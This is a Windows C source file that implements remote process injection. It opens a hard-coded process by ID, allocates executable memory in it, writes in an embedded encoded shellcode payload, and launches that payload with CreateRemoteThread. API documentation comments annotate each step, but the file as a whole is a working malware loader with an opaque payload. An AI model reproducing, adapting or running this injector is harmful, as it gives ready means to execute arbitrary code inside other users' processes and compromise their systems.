#include "stdio.h"
#include "windows.h"
#include "owl.h"

void inject(int PID);


int main(int argc, char* argv[]) {
	// printf("Hello world %s\r\n", "!");
	inject(7524);
	return 0;
}



void inject(int PID) {
	printf("[+] Inj to PID: %d\r\n", PID);

	printf("[+] Obtain handle\r\n");

	HANDLE processHandle;
	// OpenProcess()
	// https ://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	/*
		HANDLE OpenProcess(
			[in] DWORD dwDesiredAccess, // PROCESS_ALL_ACCESS
			[in] BOOL  bInheritHandle,
			[in] DWORD dwProcessId
		);
	*/
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	// VirtualAllocEx()
	/*
	LPVOID VirtualAllocEx(
		[in]           HANDLE hProcess,	// obtained by OpenProcess
		[in, optional] LPVOID lpAddress,	// If lpAddress is NULL, the function determines where to allocate the region.
		[in]           SIZE_T dwSize,	// sizeof (shellcode)
		[in]           DWORD  flAllocationType, // (MEM_RESERVE | MEM_COMMIT)
		[in]           DWORD  flProtect	// PAGE_EXECUTE_READWRITE OR 0x40
	);
	*/
	unsigned char shellcode[] = "\x54\x41\x5e\x48\x31\xd2\x49\xbd\x91\x5f\xe2\x61\xe6\x27"
								"\x6d\xf1\xd9\xcc\xb2\x23\x66\x41\x81\xe6\xf0\xf7\x49\x0f"
								"\xae\x06\x49\x83\xc6\x08\x4d\x8b\x26\x48\xff\xca\x4d\x31"
								"\x6c\xd4\x22\x48\x85\xd2\x75\xf3\x6d\x17\x61\x85\x16\xcf"
								"\xad\xf1\x91\x5f\xa3\x30\xa7\x77\x3f\xa0\xc7\x17\xd3\xb3"
								"\x83\x6f\xe6\xa3\xf1\x17\x69\x33\xfe\x6f\xe6\xa3\xb1\x17"
								"\x69\x13\xb6\x6f\x62\x46\xdb\x15\xaf\x50\x2f\x6f\x5c\x31"
								"\x3d\x63\x83\x1d\xe4\x0b\x4d\xb0\x50\x96\xef\x20\xe7\xe6"
								"\x8f\x1c\xc3\x1e\xb3\x29\x6d\x75\x4d\x7a\xd3\x63\xaa\x60"
								"\x36\xac\xed\x79\x91\x5f\xe2\x29\x63\xe7\x19\x96\xd9\x5e"
								"\x32\x31\x6d\x6f\x75\xb5\x1a\x1f\xc2\x28\xe7\xf7\x8e\xa7"
								"\xd9\xa0\x2b\x20\x6d\x13\xe5\xb9\x90\x89\xaf\x50\x2f\x6f"
								"\x5c\x31\x3d\x1e\x23\xa8\xeb\x66\x6c\x30\xa9\xbf\x97\x90"
								"\xaa\x24\x21\xd5\x99\x1a\xdb\xb0\x93\xff\x35\xb5\x1a\x1f"
								"\xc6\x28\xe7\xf7\x0b\xb0\x1a\x53\xaa\x25\x6d\x67\x71\xb8"
								"\x90\x8f\xa3\xea\xe2\xaf\x25\xf0\x41\x1e\xba\x20\xbe\x79"
								"\x34\xab\xd0\x07\xa3\x38\xa7\x7d\x25\x72\x7d\x7f\xa3\x33"
								"\x19\xc7\x35\xb0\xc8\x05\xaa\xea\xf4\xce\x3a\x0e\x6e\xa0"
								"\xbf\x29\x5c\x26\x6d\xf1\x91\x5f\xe2\x61\xe6\x6f\xe0\x7c"
								"\x90\x5e\xe2\x61\xa7\x9d\x5c\x7a\xfe\xd8\x1d\xb4\x5d\xd7"
								"\xd8\x53\xc7\x1e\x58\xc7\x73\x9a\xf0\x0e\x44\x17\x61\xa5"
								"\xce\x1b\x6b\x8d\x9b\xdf\x19\x81\x93\x22\xd6\xb6\x82\x2d"
								"\x8d\x0b\xe6\x7e\x2c\x78\x4b\xa0\x37\x0f\x89\x53\x08\x81"
								"\xf0\x3b\xcc\x04\x9e\x42\x6d\x6e";

	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	/*
	BOOL WriteProcessMemory(
		[in]  HANDLE  hProcess,
		[in]  LPVOID  lpBaseAddress,
		[in]  LPCVOID lpBuffer,
		[in]  SIZE_T  nSize,
		[out] SIZE_T * lpNumberOfBytesWritten
	);
	// If the function fails, the return value is 0 (zero).
	*/
	unsigned long long numBytesWritten = 0;
	// or size_t numBytesWritten
	if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), &numBytesWritten)) {
		printf("An error occurred while writing to remoteBuffer - (%d)\r\n", GetLastError());
		return;
	}

	
	/*
	HANDLE CreateRemoteThread(
		[in]  HANDLE                 hProcess,
		[in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
		[in]  SIZE_T                 dwStackSize,
		[in]  LPTHREAD_START_ROUTINE lpStartAddress,
		[in]  LPVOID                 lpParameter,
		[in]  DWORD                  dwCreationFlags,
		[out] LPDWORD                lpThreadId
	);
	*/
	if (!CreateRemoteThread(processHandle, NULL, 0, remoteBuffer, NULL, 0, NULL)) {
		printf("An error occurred while creating the remote thread - (%d)\r\n", GetLastError());
	}
	CloseHandle(processHandle);

	return;
}